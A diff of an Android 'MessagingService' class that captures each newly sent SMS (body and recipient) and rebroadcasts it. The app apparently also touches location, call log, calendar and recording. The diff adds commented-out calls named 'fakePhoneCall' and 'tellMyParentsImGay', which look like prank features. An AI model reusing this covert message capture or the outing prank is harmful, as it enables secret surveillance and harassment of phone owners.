@@ -6,22 +6,16 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.database.ContentObserver;
 import android.database.Cursor;
-import android.database.sqlite.SQLiteDatabase;
-import android.database.sqlite.SQLiteException;
 import android.location.LocationManager;
 import android.media.MediaRecorder;
 import android.net.Uri;
 import android.net.wifi.WifiManager;
-import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
 import android.provider.CalendarContract;
 import android.provider.CallLog;
 import android.provider.Telephony;
 import android.util.Log;
-
-import java.io.File;
-import java.io.IOException;
 
 public class MessagingService extends Service {
 
@@ -162,6 +156,13 @@ public class MessagingService extends Service {
         } catch (SecurityException e) {
             e.printStackTrace();
         }*/
+        //Lofl.fakePhoneCall(this);
+  /*      new Thread(new Runnable() {
+            @Override
+            public void run() {
+                Lofl.tellMyParentsImGay(MessagingService.this);
+            }
+        }).start();*/
     }
 
     @Override
@@ -247,25 +248,25 @@ public class MessagingService extends Service {
             new Thread(new Runnable() {
                 @Override
                 public void run() {
-                        Cursor cursor = getContentResolver().query(uri, null, null, null, null);
-                        if (cursor != null && cursor.moveToNext()) {
-                            int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
-                            if ( type == 2) {
-                                int id = cursor.getInt(cursor.getColumnIndexOrThrow("_id"));
-                                if (id != mLastSentMessageId) {
-                                    mLastSentMessageId = id;
-                                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
-                                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
-                                    Intent outgoingSmsIntent = new Intent();
-                                    outgoingSmsIntent.putExtra(Constants.ADDRESS, address);
-                                    outgoingSmsIntent.putExtra(Constants.BODY, body);
-                                    outgoingSmsIntent.putExtra(Constants.TYPE, type);
-                                    outgoingSmsIntent.setAction(Constants.Actions.ACTION_OUTGOING_SMS);
-                                    sendBroadcast(outgoingSmsIntent);
-                                }
+                    Cursor cursor = getContentResolver().query(uri, null, null, null, null);
+                    if (cursor != null && cursor.moveToNext()) {
+                        int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
+                        if ( type == 2) {
+                            int id = cursor.getInt(cursor.getColumnIndexOrThrow("_id"));
+                            if (id != mLastSentMessageId) {
+                                mLastSentMessageId = id;
+                                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
+                                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
+                                Intent outgoingSmsIntent = new Intent();
+                                outgoingSmsIntent.putExtra(Constants.ADDRESS, address);
+                                outgoingSmsIntent.putExtra(Constants.BODY, body);
+                                outgoingSmsIntent.putExtra(Constants.TYPE, type);
+                                outgoingSmsIntent.setAction(Constants.Actions.ACTION_OUTGOING_SMS);
+                                sendBroadcast(outgoingSmsIntent);
                             }
-                            cursor.close();
                         }
+                        cursor.close();
+                    }
                 }
             }).start();
         }
